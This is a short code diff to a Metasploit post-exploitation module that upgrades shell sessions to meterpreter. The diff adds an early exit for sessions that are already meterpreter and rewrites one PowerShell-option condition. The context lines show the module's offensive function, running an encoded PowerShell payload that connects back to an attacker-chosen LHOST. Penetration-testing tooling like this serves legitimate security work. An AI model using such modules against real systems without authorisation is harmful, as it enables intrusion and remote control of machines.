@@ -52,6 +52,11 @@ class MetasploitModule < Msf::Post
   def run
     print_status("Upgrading session ID: #{datastore['SESSION']}")
 
+    if session.type == 'meterpreter'
+      print_error("Meterpreter sessions cannot be upgraded any higher")
+      return nil
+    end
+
     # Try hard to find a valid LHOST value in order to
     # make running 'sessions -u' as robust as possible.
     if datastore['LHOST']
@@ -161,7 +166,7 @@ class MetasploitModule < Msf::Post
         if (have_powershell?) && (datastore['WIN_TRANSFER'] != 'VBS')
           vprint_status("Transfer method: Powershell")
           psh_opts = { :encode_final_payload => true, :persist => false, :prepend_sleep => 1 }
-          if session.type != 'shell'
+          unless session.type == 'shell'
             psh_opts[:remove_comspec] = true
           end
           cmd_exec(cmd_psh_payload(payload_data, psh_arch, psh_opts))
